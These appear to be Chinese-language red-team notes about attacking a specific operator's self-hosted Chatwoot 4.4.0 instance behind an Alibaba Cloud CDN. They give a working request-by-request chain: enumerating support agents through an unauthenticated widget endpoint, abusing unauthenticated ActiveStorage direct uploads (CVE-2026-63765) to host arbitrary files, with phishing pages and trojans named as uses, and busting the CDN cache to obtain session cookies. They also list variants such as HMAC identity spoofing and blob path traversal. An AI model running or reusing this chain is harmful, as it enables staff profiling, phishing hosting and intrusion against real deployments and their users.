# 自建 Chatwoot：未授权名单泄露 + ActiveStorage 未授权写入（实测 2026-09-26）

目标形态：运营商自建 **Chatwoot 4.4.0**（阿里云 WAF/CDN 前置），入口从运营商客户端配置里的
`gz_kefu.txt`（含 widget token + secret）拿到，域名形如 `chat-…-site-to.kf.<品牌>.com`；
其实例另有品牌客服域 `kf.<品牌>.cc`。

## 1. 未授权坐席名单（产品自带）
```
GET /api/v1/widget/inbox_members?website_token=<widget token>
→ {"payload":[{"id":…,"name":"Darcy","availability_status":"online"},…]}
```
11 名坐席（含与品牌矩阵对得上的内部代号）→ **人员画像 + 组织归属证据**，零成本。

## 2. CVE-2026-63765：未授权 ActiveStorage direct_uploads（完整 PoC）
链条（全程**不需要任何账号**，只要公开 widget 页给的一个会话 cookie + CSRF token）：
```
1) GET  /            → 取会话 cookie 与 <meta name="csrf-token">
2) POST /rails/active_storage/direct_uploads
   Content-Type: application/json   X-CSRF-Token: <token>   Cookie: <session>
   {"blob":{"filename":"redteam-poc.txt","byte_size":21,"checksum":"<base64 md5>","content_type":"text/plain"}}
   → 200 {"direct_upload":{"url":"https://<实例域>/rails/active_storage/disk/<signed>…","headers":{…}},
           "signed_id":"<signed_id>","blob":{…"service_name":"local"}}
3) PUT  <direct_upload.url>  (headers 原样带上)  body=<内容> → 204
4) GET  /rails/active_storage/blobs/redirect/<signed_id>/redteam-poc.txt → 200，回显上传内容
```
**已验证可取回**（本次回显 `REDTEAM-POC-MARKER-…`）⇒ 效果 = **在目标域名上托管任意内容的文件**
（钓鱼页/马/跳板载体），且落在他们的存储与域名下，肉眼可信。
其余需登录路由鉴权正常 —— **只有 direct-uploads 漏鉴权**（这就是该 CVE 的边界）。

## 3. 破 CDN 缓存吃 cookie（本链的前置条件）
阿里云盾/CDN 会把公开页的响应**连 `Set-Cookie` 一起缓存** ⇒ 反复取页面永远没有会话，
CSRF token 也配不上会话。解法：
```
GET /?_=<random>          # 缓存穿透参数,每请求唯一
```
拿到真 `Set-Cookie` 后再取 CSRF token，同一次会话内完成 2)~4)。
（另一种建立会话的路子：`/app/login`；session 获取不稳时交替用。）

## 4. 同实例变体（本部署未成立，别默认可用）
- `PATCH /api/v1/widget/contact/set_user` + `identifier`/`identifier_hash`（用 secret 算 HMAC，hex/base64 两种编码都试）
  → 本部署恒 **404**（自定义集成路径 `/cw_kf/widget.html` 形状不同）—— 换实例再试，别据此判「这条路不存在」。
- 想拿任意文件读写（blob 的 `key` 路径穿越）需稳定会话，本次未稳定复现 → 优先级低于上面已验证的链。
